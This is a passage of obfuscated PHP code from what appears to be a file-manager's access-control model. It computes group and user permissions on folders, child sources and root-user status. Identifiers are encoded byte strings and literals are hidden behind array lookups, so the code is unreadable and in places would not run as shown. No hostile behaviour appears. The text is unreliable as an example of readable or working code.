$ıçş‘€Ş[$‰üÏó×[1943]] = $ı…ÀÆ && $ı…ÀÆ[$‰üÏó×[2377]] == 1; $ÀËü—œ = $this->groupRootAuth($‰­ÆÇÛª, $ıçş‘€Ş[$‰üÏó×[1592]]); $ÀËü—œ = $ıçş‘€Ş[$‰üÏó×[1943]] ? $…Ğú‹°± : $ÀËü—œ; $ÑÅËˆä¬[$é™æÜÅ] = array($‰üÏó×[2378] => $‰üÏó×[2379], $‰üÏó×[2380] => LNG($‰üÏó×[2381]), $‰üÏó×[2358] => array_field_key($ıçş‘€Ş, $ŒØŞûì¸), $‰üÏó×[502] => $ÀËü—œ, $‰üÏó×[503] => $ÀËü—œ[$‰üÏó×[502]], $‰üÏó×[2382] => $ˆë¶ú¼š); } } $GLOBALS[$‰üÏó×[7]][$‰üÏó×[428]] = $ÁÁÌœáû[$‰üÏó×[428]]; $GLOBALS[$‰üÏó×[7]][$‰üÏó×[439]] = $ÁÁÌœáû[$‰üÏó×[439]]; foreach ($Ø€Şì£ as $Õúï¯¸å => $Âí¯˜›ş) { if (!$Âí¯˜›ş) { continue; } foreach ($Âí¯˜›ş as $ı®ö´ú•) { if (!$ı®ö´ú• || !$ı®ö´ú•[$‰üÏó×[589]] || $ı®ö´ú•[$‰üÏó×[589]] == $‰üÏó×[228]) { continue; } if ($ı®ö´ú•[$‰üÏó×[188]] != SourceModel::TYPE_USER) { continue; } $é™æÜÅ = $ı®ö´ú•[$‰üÏó×[589]] . $‰üÏó×[12]; if (isset($ÑÅËˆä¬[$é™æÜÅ])) { continue; } $âŸ©Œàâ = $this->authMake($Âí¯˜›ş, $é™æÜÅ); if (!$âŸ©Œàâ || !$âŸ©Œàâ[$‰üÏó×[2380]]) { continue; } $ÑÅËˆä¬[$é™æÜÅ] = array($‰üÏó×[2378] => $‰üÏó×[2383], $‰üÏó×[2380] => $âŸ©Œàâ[$‰üÏó×[2380]], $‰üÏó×[2358] => Model($‰üÏó×[617])->getInfoSimpleOuter($é™æÜÅ), $‰üÏó×[502] => $âŸ©Œàâ[$‰üÏó×[556]], $‰üÏó×[503] => $âŸ©Œàâ[$‰üÏó×[556]][$‰üÏó×[502]], $‰üÏó×[2382] => $âŸ©Œàâ[$‰üÏó×[2384]]); } } foreach ($Ø€Şì£ as $Õúï¯¸å => $Âí¯˜›ş) { if (!$Âí¯˜›ş) { continue; } foreach ($ÑÅËˆä¬ as $é™æÜÅ => $©ÍüŞËø) { if ($©ÍüŞËø[$‰üÏó×[2358]][$‰üÏó×[1943]] || $©ÍüŞËø[$‰üÏó×[2378]] == $‰üÏó×[2383]) { continue; } $âŸ©Œàâ = $this->authMake($Âí¯˜›ş, $é™æÜÅ); if (!$âŸ©Œàâ || !$âŸ©Œàâ[$‰üÏó×[2380]]) { continue; } $ÑÅËˆä¬[$é™æÜÅ] = array($‰üÏó×[2378] => $‰üÏó×[2383], $‰üÏó×[2380] => $âŸ©Œàâ[$‰üÏó×[2380]], $‰üÏó×[2358] => $©ÍüŞËø[$‰üÏó×[2358]], $‰üÏó×[502] => $âŸ©Œàâ[$‰üÏó×[556]], $‰üÏó×[503] => $âŸ©Œàâ[$‰üÏó×[556]][$‰üÏó×[502]], $‰üÏó×[2382] => $âŸ©Œàâ[$‰üÏó×[2384]]); } } $ÑÅËˆä¬ = array_sort_by($ÑÅËˆä¬, $‰üÏó×[503], $‰üÏó×[540]); return $ÑÅËˆä¬; } public function getAllChildren($ê¶¦Ç˜) { $ÀÅ“çç¦ =& $_SERVER[©—Ò»ÅĞ]; $°ö¸ÛŞå = Model($ÀÅ“çç¦[1533])->sourceInfo($ê¶¦Ç˜); if ($°ö¸ÛŞå[$ÀÅ“çç¦[500]] != $ÀÅ“çç¦[91]) { return $this->sourceListAuth(array($ê¶¦Ç˜)); } if ($°ö¸ÛŞå[$ÀÅ“çç¦[188]] != SourceModel::TYPE_GROUP) { return array(); } $»ì¬ú›Û = 1; $Ë×“ëîî = array($ê¶¦Ç˜); if ($°ö¸ÛŞå[$ÀÅ“çç¦[190]] == $ÀÅ“çç¦[228] && $°ö¸ÛŞå[$ÀÅ“çç¦[589]] != $»ì¬ú›Û) { $Ë×“ëîî = $this->groupChidldAllRootSource($°ö¸ÛŞå[$ÀÅ“çç¦[589]]); } $¾õ—©³ƒ = $this->field($ÀÅ“çç¦[191])->group($ÀÅ“çç¦[191])->select(); $¾õ—©³ƒ = array_to_keyvalue($¾õ—©³ƒ, $ÀÅ“çç¦[12], $ÀÅ“çç¦[191]); if (!$¾õ—©³ƒ) { return array(); } $ş‡æ¨¸ = $ÀÅ“çç¦[2385]; $¦ø”À¦™ = array($ÀÅ“çç¦[191] => array($ÀÅ“çç¦[7], $¾õ—©³ƒ), $ÀÅ“çç¦[520] => $ÀÅ“çç¦[228]); $¡îõÚËË = Model($ÀÅ“çç¦[933])->field($ş‡æ¨¸)->where($¦ø”À¦™)->select(); $™‹ş” = array($ê¶¦Ç˜); foreach ($¡îõÚËË as $çğõ«Öå) { foreach ($Ë×“ëîî as $Ã°¢ø¸) { $©İéå£ = $ÀÅ“çç¦[50] . $Ã°¢ø¸ . $ÀÅ“çç¦[50]; $Ğàœá¡İ = $çğõ«Öå[$ÀÅ“çç¦[604]] . $çğõ«Öå[$ÀÅ“çç¦[191]] . $ÀÅ“çç¦[50]; if (strstr($Ğàœá¡İ, $©İéå£)) { $™‹ş”[] = $çğõ«Öå[$ÀÅ“çç¦[191]]; break; } } } return $this->sourceListAuth($™‹ş”); } private function sourceListAuth($›¯åª‰) { $âæ£€ï =& $_SERVER[©—Ò»ÅĞ]; $“óÔ¨ÂØ = Model($âæ£€ï[1533])->sourceListInfo($›¯åª‰, !0); $¼È»¢é¾ = $this->sourceAuthSelect($›¯åª‰); $¶¹Â…•à = array(); $‰ãƒûİä = array(); foreach ($“óÔ¨ÂØ as $öØ²úï—) { unset($öØ²úï—[$âæ£€ï[543]]); unset($öØ²úï—[$âæ£€ï[541]]); unset($öØ²úï—[$âæ£€ï[502]]); unset($öØ²úï—[$âæ£€ï[90]]); $™æç³ÊÚ = $¼È»¢é¾[$öØ²úï—[$âæ£€ï[191]]]; if (!$™æç³ÊÚ) { continue; } $öØ²úï—[$âæ£€ï[2382]] = $this->authTargetInfo($™æç³ÊÚ); $öØ²úï—[$âæ£€ï[602]] = rtrim($öØ²úï—[$âæ£€ï[608]], $âæ£€ï[8]) . $âæ£€ï[8] . ltrim($öØ²úï—[$âæ£€ï[602]], $âæ£€ï[8]); $¶¹Â…•à[] = $öØ²úï—; $ÖÒÁí¿ = count(explode($âæ£€ï[8], trim($öØ²úï—[$âæ£€ï[602]], $âæ£€ï[8]))); $‰ãƒûİä[] = $ÖÒÁí¿ + ($öØ²úï—[$âæ£€ï[33]] == $âæ£€ï[78] ? 0 : 1000); } array_multisort($‰ãƒûİä, SORT_ASC, $¶¹Â…•à); return $¶¹Â…•à; } private function groupChidldAllRootSource($Êˆ¸°) { $øàÛøã =& $_SERVER[©—Ò»ÅĞ]; $Ä´À¸û² = Model($øàÛøã[1493])->groupChildrenAll($Êˆ¸°); $“°£ÃŞƒ = array($øàÛøã[190] => 0, $øàÛøã[589] => array($øàÛøã[7], $Ä´À¸û²), $øàÛøã[188] => SourceModel::TYPE_GROUP); $³ÒËİÆÀ = Model($øàÛøã[933])->field($øàÛøã[191])->where($“°£ÃŞƒ)->select(); $³ÒËİÆÀ = array_to_keyvalue($³ÒËİÆÀ, $øàÛøã[12], $øàÛøã[191]); return $³ÒËİÆÀ; } private function authTargetInfo($ ØáÑ”°) { $²ãß­ß =& $_SERVER[©—Ò»ÅĞ]; $¯ÕìŠæø = array(); $ìõœš½÷ = array(); $ÆÁÏˆæ = 2 << 25; foreach ($ ØáÑ”° as $Ú…ƒ) { $û·”ë‚Œ = Model($²ãß­ß[591])->listData($Ú…ƒ[$²ãß­ß[1640]]); if (!$û·”ë‚Œ) { continue; } if ($Ú…ƒ[$²ãß­ß[188]] == SourceModel::TYPE_USER) { $õ­âÕÈõ = Model($²ãß­ß[597])->getInfoSimpleOuter($Ú…ƒ[$²ãß­ß[589]]); if ($õ­âÕÈõ[$²ãß­ß[1592]] == $²ãß­ß[1380]) { continue; } if ($õ­âÕÈõ[$²ãß­ß[1592]] == $²ãß­ß[228]) { $õ­âÕÈõ[$²ãß­ß[32]] = LNG($²ãß­ß[2386]); } } else { $õ­âÕÈõ = Model($²ãß­ß[605])->getInfoSimple($Ú…ƒ[$²ãß­ß[589]]); } if (!$õ­âÕÈõ) { continue; } $õ­âÕÈõ[$²ãß­ß[556]] = $û·”ë‚Œ; $¯ÕìŠæø[] = $õ­âÕÈõ; $¸ Ğ’Ò = 0; if ($Ú…ƒ[$²ãß­ß[188]] == SourceModel::TYPE_GROUP) { $¸ Ğ’Ò = $ÆÁÏˆæ * 2; } if ($Ú…ƒ[$²ãß­ß[188]] == SourceModel::TYPE_USER) { $¸ Ğ’Ò = $ÆÁÏˆæ; } if ($Ú…ƒ[$²ãß­ß[188]] == SourceModel::TYPE_USER && $Ú…ƒ[$²ãß­ß[589]] == $²ãß­ß[228]) { $¸ Ğ’Ò = 0; } $ìõœš½÷[] = $û·”ë‚Œ[$²ãß­ß[502]] + $¸ Ğ’Ò; } array_multisort($ìõœš½÷, SORT_DESC, $¯ÕìŠæø); return $¯ÕìŠæø; } public function getAllChildrenByUser($ì·Âì†õ, $µ¾‹­í) { $ÙÑœïµÊ =& $_SERVER[©—Ò»ÅĞ]; $ãî¶Şö¡ = Model($ÙÑœïµÊ[617])->getInfo($µ¾‹­í); if (!$µ¾‹­í || !$ì·Âì†õ || !$ãî¶Şö¡) { return array(); } $Æº‹¼µ“ = Model($ÙÑœïµÊ[1533])->sourceInfo($ì·Âì†õ); $ØŒàÈŸ§ = array(); $ğ½—ªæ¤ = 1; if ($Æº‹¼µ“[$ÙÑœïµÊ[190]] == $ÙÑœïµÊ[228] && $Æº‹¼µ“[$ÙÑœïµÊ[589]] != $ğ½—ªæ¤ && $this->groupContainUser($Æº‹¼µ“[$ÙÑœïµÊ[589]], $µ¾‹­í)) { foreach ($ãî¶Şö¡[$ÙÑœïµÊ[1494]] as $¥Ï×‚´¥) { $°áàî¬ = Model($ÙÑœïµÊ[605])->getInfo($¥Ï×‚´¥[$ÙÑœïµÊ[1495]]); $¢ª¯ø¿É = Model($ÙÑœïµÊ[617])->getInfoSimpleOuter($µ¾‹­í); $¢ª¯ø¿É[$ÙÑœïµÊ[556]] = $¥Ï×‚´¥[$ÙÑœïµÊ[502]]; if (Model($ÙÑœïµÊ[591])->authCheckAction($¥Ï×‚´¥[$ÙÑœïµÊ[502]][$ÙÑœïµÊ[502]], $ÙÑœïµÊ[1564])) { continue; } $ƒ´Ì¬ıã = array($ÙÑœïµÊ[32] => $ÙÑœïµÊ[1398] . $°áàî¬[$ÙÑœïµÊ[32]], $ÙÑœïµÊ[191] => $°áàî¬[$ÙÑœïµÊ[90]][$ÙÑœïµÊ[191]], $ÙÑœïµÊ[87] => KodIO::make($°áàî¬[$ÙÑœïµÊ[90]][$ÙÑœïµÊ[191]]), $ÙÑœïµÊ[190] => $ÙÑœïµÊ[228], $ÙÑœïµÊ[188] => $ÙÑœïµÊ[598], $ÙÑœïµÊ[33] => $ÙÑœïµÊ[639], $ÙÑœïµÊ[602] => $°áàî¬[$ÙÑœïµÊ[609]], $ÙÑœïµÊ[1495] => $°áàî¬[$ÙÑœïµÊ[1495]], $ÙÑœïµÊ[606] => $°áàî¬[$ÙÑœïµÊ[190]], $ÙÑœïµÊ[2382] => array($¢ª¯ø¿É)); $ØŒàÈŸ§[$ƒ´Ì¬ıã[$ÙÑœïµÊ[191]]] = $ƒ´Ì¬ıã; } } $Ø¦Şæ´â = array(); $ÂéÌ£ÂÈ = $this->getAllChildren($ì·Âì†õ); foreach ($ÂéÌ£ÂÈ as $éÛÃÛ¶û) { $ËÆÏ‰…ş = !1; foreach ($éÛÃÛ¶û[$ÙÑœïµÊ[2382]] as $­×åÅÄØ) { if ($­×åÅÄØ[$ÙÑœïµÊ[1592]]) { if ($­×åÅÄØ[$ÙÑœïµÊ[1592]] == $µ¾‹­í) { $ËÆÏ‰…ş = !0; break; } } if ($­×åÅÄØ[$ÙÑœïµÊ[1495]]) { if ($this->groupContainUser($­×åÅÄØ[$ÙÑœïµÊ[1495]], $µ¾‹­í)) { $ËÆÏ‰…ş = !0; break; } } } if ($ËÆÏ‰…ş) { $Ø¦Şæ´â[] = $éÛÃÛ¶û; } $ˆ¹áÉ„ = $éÛÃÛ¶û[$ÙÑœïµÊ[191]]; if (isset($ØŒàÈŸ§[$ˆ¹áÉ„])) { $éÛÃÛ¶û[$ÙÑœïµÊ[2382]][] = $ØŒàÈŸ§[$ˆ¹áÉ„][0]; $ØŒàÈŸ§[$ˆ¹áÉ„] = !1; } } $ØŒàÈŸ§ = array_filter(array_values($ØŒàÈŸ§)); $Ø¦Şæ´â = array_merge($ØŒàÈŸ§, $Ø¦Şæ´â); return $Ø¦Şæ´â; } public function setAllChildrenByUser($—¢ÈĞğû, $éÊù¸„, $ê×Šü”¯) { $¾è™Òàì =& $_SERVER[©—Ò»ÅĞ]; $ÙäŒ¬µö = $this->getAllChildrenByUser($—¢ÈĞğû, $éÊù¸„); if (!$ê×Šü”¯ || !$ÙäŒ¬µö) { return !1; } foreach ($ÙäŒ¬µö as $ïš•Şİ¯) { $÷Æ®ôĞ¤ = array(); foreach ($ïš•Şİ¯[$¾è™Òàì[2382]] as $àº”ÏÅ›) { $«Æğ­¼õ = $àº”ÏÅ›[$¾è™Òàì[556]]; $êİ»şÈ´ = $àº”ÏÅ›[$¾è™Òàì[1592]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $·üûäÛÎ = $àº”ÏÅ›[$¾è™Òàì[1592]] ? $àº”ÏÅ›[$¾è™Òàì[1592]] : $àº”ÏÅ›[$¾è™Òàì[1495]]; if ($àº”ÏÅ›[$¾è™Òàì[1592]] && $àº”ÏÅ›[$¾è™Òàì[1592]] == $éÊù¸„) { continue; } $÷Æ®ôĞ¤[] = array($¾è™Òàì[191] => $ïš•Şİ¯[$¾è™Òàì[191]], $¾è™Òàì[188] => $êİ»şÈ´, $¾è™Òàì[589] => intval($·üûäÛÎ), $¾è™Òàì[1640] => isset($«Æğ­¼õ[$¾è™Òàì[487]]) ? intval($«Æğ­¼õ[$¾è™Òàì[487]]) : 0, $¾è™Òàì[2346] => isset($«Æğ­¼õ[$¾è™Òàì[2346]]) ? intval($«Æğ­¼õ[$¾è™Òàì[2346]]) : -1); } $÷Æ®ôĞ¤[] = array($¾è™Òàì[191] => $ïš•Şİ¯[$¾è™Òàì[191]], $¾è™Òàì[188] => SourceModel::TYPE_USER, $¾è™Òàì[589] => intval($éÊù¸„), $¾è™Òàì[1640] => intval($ê×Šü”¯), $¾è™Òàì[2346] => -1); $this->where(array($¾è™Òàì[506] => $ïš•Şİ¯[$¾è™Òàì[191]]))->delete(); $this->addAll($÷Æ®ôĞ¤); } return !0; } public function get($“’ú˜©) { $ª¼ûÏ“– = $this->getSourceList(array($“’ú˜©), !0); return $ª¼ûÏ“–[0]; } public function getSourceList($ó£§×‘¸, $áç¹Î¢Ó = false, $Ìô°ğÖ = false) { $ÕŸ›÷®‰ =& $_SERVER[©—Ò»ÅĞ]; if (!$ó£§×‘¸) { return array(); } $«‚µ×• = Model($ÕŸ›÷®‰[1533]); if (!$áç¹Î¢Ó && count($ó£§×‘¸) == 1) { $áç¹Î¢Ó = array(); $áç¹Î¢Ó[$ó£§×‘¸[0]] = $«‚µ×•->sourceInfo($ó£§×‘¸[0]); } if (!$áç¹Î¢Ó) { $´ø—îû = array($ÕŸ›÷®‰[506] => array($ÕŸ›÷®‰[507], $ó£§×‘¸)); $áç¹Î¢Ó = $«‚µ×•->field($ÕŸ›÷®‰[2387])->where($´ø—îû)->select(); $áç¹Î¢Ó = array_to_keyvalue($áç¹Î¢Ó, $ÕŸ›÷®‰[191]); } $¹ö”ƒø™ = $ó£§×‘¸; foreach ($áç¹Î¢Ó as $şİûêÂ => $Û»ôËİ) { $ÉòÍ = $«‚µ×•->parentLevelArray($Û»ôËİ[$ÕŸ›÷®‰[604]]); $¹ö”ƒø™ = array_merge($¹ö”ƒø™, array(intval($şİûêÂ)), array_reverse($ÉòÍ)); } $¹ö”ƒø™ = array_values(array_unique($¹ö”ƒø™)); if (!$¹ö”ƒø™) { return array(); } $˜‡ùÂĞ = $this->sourceAuthSelect($¹ö”ƒø™); $İ‡©Íì¶ = array(); foreach ($¹ö”ƒø™ as $€ »Úúä) { if (isset($˜‡ùÂĞ[$€ »Úúä])) { $İ‡©Íì¶[$€ »Úúä] = $˜‡ùÂĞ[$€ »Úúä]; } } $ªÔŸ—å« = $this->userIsRoot($Ìô°ğÖ); $ÛºÆ—Ï¾ = AuthModel::authAll(); $Åßì¸çÖ = array($ÕŸ›÷®‰[503] => $ÛºÆ—Ï¾, $ÕŸ›÷®‰[2388] => array($ÕŸ›÷®‰[508] => 0, $ÕŸ›÷®‰[2189] => $ÛºÆ—Ï¾, $ÕŸ›÷®‰[509] => LNG($ÕŸ›÷®‰[2369]), $ÕŸ›÷®‰[2204] => $ÕŸ›÷®‰[2370])); $éŸ¬±šÔ = array(); foreach ($áç¹Î¢Ó as $€ »Úúä => $áö¯¼ûÔ) { if ($ªÔŸ—å« && $GLOBALS[$ÕŸ›÷®‰[6]][$ÕŸ›÷®‰[2202]]) { $éŸ¬±šÔ[$€ »Úúä] = $Åßì¸çÖ; continue; } $éŸ¬±šÔ[$€ »Úúä] = $this->makeSourceAuth($áö¯¼ûÔ, $İ‡©Íì¶, $Ìô°ğÖ); } return $éŸ¬±šÔ; } public function authDeepCheck($šš‰«ˆğ, $Õ‡ûåÎó = false) { $“ğö„êŒ =& $_SERVER[©—Ò»ÅĞ]; $Õ‡ûåÎó = $Õ‡ûåÎó ? $Õ‡ûåÎó : USER_ID; $Ò¨É¼Ö = $this->makeAuthDeep($Õ‡ûåÎó); if (!in_array($šš‰«ˆğ, $Ò¨É¼Ö[$“ğö„êŒ[2389]])) { return !1; } $‰‡˜•Õ½ = array(); foreach ($Ò¨É¼Ö[$“ğö„êŒ[2390]] as $ö‚£Ê«ç => $÷Ñä’²š) { if (!in_array($šš‰«ˆğ, $÷Ñä’²š)) { continue; } $‰‡˜•Õ½[] = $ö‚£Ê«ç; } if (!$‰‡˜•Õ½) { return !1; } $ÎíïôÛÛ = $‰‡˜•Õ½ ? $‰‡˜•Õ½[0] : $šš‰«ˆğ; return array($“ğö„êŒ[503] => -1, $“ğö„êŒ[556] => array($“ğö„êŒ[508] => $“ğö„êŒ[1380], $“ğö„êŒ[2189] => $“ğö„êŒ[228], $“ğö„êŒ[509] => LNG($“ğö„êŒ[2391]), $“ğö„êŒ[2204] => $“ğö„êŒ[2392]), $“ğö„êŒ[2380] => LNG($“ğö„êŒ[2393]), $“ğö„êŒ[2394] => $this->sourceAuthInfo($ÎíïôÛÛ)); } protected function makeAuthDeep($¿åìĞœµ = false) { $‘ÍÁïöÁ =& $_SERVER[©—Ò»ÅĞ]; static $„ƒ†´ãÅ = array(); $¿åìĞœµ = $¿åìĞœµ ? $¿åìĞœµ : USER_ID; if (isset($„ƒ†´ãÅ[$¿åìĞœµ])) { return $„ƒ†´ãÅ[$¿åìĞœµ]; } $Êı¨ó×ª = Model($‘ÍÁïöÁ[2395])->listData(); $ëòü‰•• = array(); foreach ($Êı¨ó×ª as $‘ı§«™¹) { if ($‘ı§«™¹[$‘ÍÁïöÁ[502]] == 0 && $‘ı§«™¹[$‘ÍÁïöÁ[2203]] == $‘ÍÁïöÁ[91]) { $ëòü‰••[] = $‘ı§«™¹[$‘ÍÁïöÁ[487]]; } } $º¢ßİÜ = $this->userGroupParents($¿åìĞœµ); $š²Ÿóâ„ = array($‘ÍÁïöÁ[188] => SourceModel::TYPE_USER, $‘ÍÁïöÁ[589] => $¿åìĞœµ); if ($º¢ßİÜ) { $š²Ÿóâ„ = array(array($‘ÍÁïöÁ[188] => SourceModel::TYPE_USER, $‘ÍÁïöÁ[589] => $¿åìĞœµ), array($‘ÍÁïöÁ[188] => SourceModel::TYPE_GROUP, $‘ÍÁïöÁ[589] => array($‘ÍÁïöÁ[507], $º¢ßİÜ)), $‘ÍÁïöÁ[1168] => $‘ÍÁïöÁ[2285]); } $¨û¶Ïõ‰ = $this->field($‘ÍÁïöÁ[2396])->where($š²Ÿóâ„)->select(); $ÓĞøÍÎ÷ = array(); $¶ïá½–Ñ = array_to_keyvalue_group($¨û¶Ïõ‰, $‘ÍÁïöÁ[191]); foreach ($¶ïá½–Ñ as $È±ÊÈ¦’ => $ Óª™²³) { $ğÃÏ£ŒÈ = $this->authArrayCheck($ Óª™²³, $¿åìĞœµ); if ($ğÃÏ£ŒÈ[$‘ÍÁïöÁ[503]] > 0) { $ÓĞøÍÎ÷[] = $È±ÊÈ¦’ . $‘ÍÁïöÁ[12]; } } if ($º¢ßİÜ) { $®Í–×À” = Model($‘ÍÁïöÁ[605]); foreach ($º¢ßİÜ as $ÂŒ—Ö¤°) { $¹ãù‘¢© = $®Í–×À”->getInfo($ÂŒ—Ö¤°); if (!$¹ãù‘¢© || !is_array($¹ãù‘¢©[$‘ÍÁïöÁ[90]])) { continue; } $ÓĞøÍÎ÷[] = $¹ãù‘¢©[$‘ÍÁïöÁ[90]][$‘ÍÁïöÁ[191]]; } } $Øî”úë¸ = array(); $ñ–¥ß  = $º¢ßİÜ; $†ŠççŠœ = Model($‘ÍÁïöÁ[1533]); $®Í–×À” = Model($‘ÍÁïöÁ[605]); $ûË¢×¶³ = array(); $ÎÍ‡ Äá = array(); $ëË’œû = array(); $µÑûÚµÑ = array(); if ($ÓĞøÍÎ÷) { $©¦°Ğ€½ = $†ŠççŠœ->where(array($‘ÍÁïöÁ[191] => array($‘ÍÁïöÁ[507], $ÓĞøÍÎ÷)))->select(); foreach ($©¦°Ğ€½ as $ò‘ŒôöØ) { if ($ò‘ŒôöØ[$‘ÍÁïöÁ[520]] == $‘ÍÁïöÁ[91]) { continue; } $ù¡¤£¤Ñ = $†ŠççŠœ->parentLevelArray($ò‘ŒôöØ[$‘ÍÁïöÁ[604]]); $Øî”úë¸ = array_merge($Øî”úë¸, $ù¡¤£¤Ñ); $ñ–¥ß [] = $ò‘ŒôöØ[$‘ÍÁïöÁ[589]]; $ûË¢×¶³[$ò‘ŒôöØ[$‘ÍÁïöÁ[191]]] = $ù¡¤£¤Ñ; $ÎÍ‡ Äá[$ò‘ŒôöØ[$‘ÍÁïöÁ[191]]] = $ò‘ŒôöØ[$‘ÍÁïöÁ[589]]; } } $ñ–¥ß  = array_values(array_unique($ñ–¥ß )); $° ßÍÙ™ = $ñ–¥ß ; foreach ($° ßÍÙ™ as $ÂŒ—Ö¤°) { $¹ãù‘¢© = $®Í–×À”->getInfo($ÂŒ—Ö¤°); $ù¡¤£¤Ñ = $†ŠççŠœ->parentLevelArray($¹ãù‘¢©[$‘ÍÁïöÁ[604]]); $ñ–¥ß  = array_merge($ñ–¥ß , $ù¡¤£¤Ñ); } $ñ–¥ß  = array_values(array_unique($ñ–¥ß )); foreach ($ñ–¥ß  as $ÂŒ—Ö¤°) { $¹ãù‘¢© = $®Í–×À”->getInfo($ÂŒ—Ö¤°); $Øî”úë¸[] = $¹ãù‘¢©[$‘ÍÁïöÁ[90]][$‘ÍÁïöÁ[191]]; $ëË’œû[$ÂŒ—Ö¤°] = $¹ãù‘¢©[$‘ÍÁïöÁ[90]][$‘ÍÁïöÁ[191]]; $µÑûÚµÑ[$ÂŒ—Ö¤°] = $†ŠççŠœ->parentLevelArray($¹ãù‘¢©[$‘ÍÁïöÁ[604]]); } foreach ($ûË¢×¶³ as $½‡ˆ¨ÍÑ => $ä†ˆÀÄ) { $¯¤¥ö¸ = $ÎÍ‡ Äá[$½‡ˆ¨ÍÑ]; if (!$¯¤¥ö¸ || !$ëË’œû[$¯¤¥ö¸]) { continue; } $Êıöæï = array(); foreach ($µÑûÚµÑ[$¯¤¥ö¸] as $ÂŒ—Ö¤°) { $Êıöæï[] = $ëË’œû[$ÂŒ—Ö¤°]; } $ûË¢×¶³[$½‡ˆ¨ÍÑ] = array_merge($Êıöæï, $ä†ˆÀÄ); } $Øî”úë¸ = array_values(array_unique($Øî”úë¸)); $‹«÷ş = array($‘ÍÁïöÁ[2389] => $Øî”úë¸, $‘ÍÁïöÁ[2390] => $ûË¢×¶³); $„ƒ†´ãÅ[$¿åìĞœµ] = $‹«÷ş; return $‹«÷ş; } private function makeSourceAuth($Î¸¬Ò¼ì, $àïÁ©ß, $µ¡ô°¢÷ = false) { $ñ²¿â‘ =& $_SERVER[©—Ò»ÅĞ]; $£ÔÊà©½ = $ñ²¿â‘[91]; $£Ø‚Ú€œ = $Î¸¬Ò¼ì[$ñ²¿â‘[589]]; $©Ô÷ÅãØ = $Î¸¬Ò¼ì[$ñ²¿â‘[188]] == SourceModel::TYPE_GROUP; $‰…ó‹Â = $©Ô÷ÅãØ ? $this->groupRootAuth($£Ø‚Ú€œ, $µ¡ô°¢÷) : !1; if ($‰…ó‹Â && Model($ñ²¿â‘[591])->authCheckAction($‰…ó‹Â[$ñ²¿â‘[502]], $ñ²¿â‘[1564])) { return $this->groupAuthInfo($‰…ó‹Â, $£Ø‚Ú€œ); } $£ù Ë‹è = Model($ñ²¿â‘[1533])->parentLevelArray($Î¸¬Ò¼ì[$ñ²¿â‘[604]]); $£ù Ë‹è = array_merge(array($Î¸¬Ò¼ì[$ñ²¿â‘[191]]), array_reverse($£ù Ë‹è)); $“æ“Û•‚ = !1; foreach ($£ù Ë‹è as $­È¹ÃÆ) { if (!isset($àïÁ©ß[$­È¹ÃÆ])) { continue; } $¤Ù–Ü¡ü = $this->authMake($àïÁ©ß[$­È¹ÃÆ], $µ¡ô°¢÷); if ($¤Ù–Ü¡ü[$ñ²¿â‘[556]]) { $“æ“Û•‚ = $¤Ù–Ü¡ü; break; } } if (!$©Ô÷ÅãØ) { return $“æ“Û•‚; } if (!$“æ“Û•‚ && $‰…ó‹Â) { $“æ“Û•‚ = $this->groupAuthInfo($‰…ó‹Â, $£Ø‚Ú€œ); } if (!$“æ“Û•‚) { $‚èŠı‰§ = Model($ñ²¿â‘[605])->getInfo($£Ø‚Ú€œ); $É¹ÙÒí• = explode($ñ²¿â‘[50], trim($‚èŠı‰§[$ñ²¿â‘[604]], $ñ²¿â‘[50])); $É¹ÙÒí• = array_reverse($É¹ÙÒí•); foreach ($É¹ÙÒí• as $’ë¡ùä€) { if ($’ë¡ùä€ == $ñ²¿â‘[228] || $’ë¡ùä€ == $£ÔÊà©½) { continue; } $›çİÙíÆ = $this->groupRootAuth($’ë¡ùä€, $µ¡ô°¢÷); if (!$›çİÙíÆ) { continue; } $“æ“Û•‚ = $this->groupAuthInfo($›çİÙíÆ, $’ë¡ùä€); break; } } if (!$“æ“Û•‚ || $“æ“Û•‚[$ñ²¿â‘[503]] <= 0) { $ëÂ«ª®õ = $this->authDeepCheck($Î¸¬Ò¼ì[$ñ²¿â‘[191]], $µ¡ô°¢÷); if ($ëÂ«ª®õ) { $“æ“Û•‚ = $ëÂ«ª®õ; } } return $“æ“Û•‚; } private function userIsRoot($˜â’‘µ€ = false) { $ãï ŒÕà =& $_SERVER[©—Ò»ÅĞ]; if (!$˜â’‘µ€ && KodUser::isRoot()) { return !0; } $‘êâ£Á¬ = Model($ãï ŒÕà[617])->getInfo($˜â’‘µ€); $ÓûéÑÙ­ = Model($ãï ŒÕà[2373])->listData($‘êâ£Á¬[$ãï ŒÕà[2374]]); if ($ÓûéÑÙ­ && $ÓûéÑÙ­[$ãï ŒÕà[595]][$ãï ŒÕà[2377]] == 1) { return !0; } return !1; } private function sourceAuthInfo($«’•Á‰¬) { $ƒÎ„«Üø =& $_SERVER[©—Ò»ÅĞ]; $“©§î÷Ë = Model($ƒÎ„«Üø[1533]); $„²àò³ = $“©§î÷Ë->sourceInfo($«’•Á‰¬); if (!$„²àò³) { return !1; } $“©§î÷Ë->groupPathDisplay($„²àò³); $ÔêéÓ¢Ü = array($„²àò³); $ÔêéÓ¢Ü = $“©§î÷Ë->_listAppendPath($ÔêéÓ¢Ü, !1); $„²àò³ = $ÔêéÓ¢Ü[0]; $·â•Ô = $„²àò³[$ƒÎ„«Üø[602]]; if (isset($„²àò³[$ƒÎ„«Üø[610]])) { $ƒ¼‚Èò¼ = explode($ƒÎ„«Üø[8], trim($„²àò³[$ƒÎ„«Üø[602]], $ƒÎ„«Üø[8])); array_shift($ƒ¼‚Èò¼); $·â•Ô = $„²àò³[$ƒÎ„«Üø[608]] . $ƒÎ„«Üø[2397] . implode($ƒÎ„«Üø[8], $ƒ¼‚Èò¼); } return array($ƒÎ„«Üø[32] => $„²àò³[$ƒÎ„«Üø[32]], $ƒÎ„«Üø[191] => $„²àò³[$ƒÎ„«Üø[191]], $ƒÎ„«Üø[87] => KodIO::make($„²àò³[$ƒÎ„«Üø[191]]), $ƒÎ„«Üø[602] => $·â•Ô); } private function groupAuthInfo($ÄÌ¤°¹¸, $×ó”ƒµ•) { $ÓñİÍ‚Ü =& $_SERVER[©—Ò»ÅĞ]; $×ô›²ô‰ = Model($ÓñİÍ‚Ü[605])->getInfo($×ó”ƒµ•); return array($ÓñİÍ‚Ü[2398] => intval($ÄÌ¤°¹¸[$ÓñİÍ‚Ü[502]]), $ÓñİÍ‚Ü[2388] => $ÄÌ¤°¹¸, $ÓñİÍ‚Ü[2399] => LNG($ÓñİÍ‚Ü[2400]), $ÓñİÍ‚Ü[2394] => array($ÓñİÍ‚Ü[509] => $×ô›²ô‰[$ÓñİÍ‚Ü[32]], 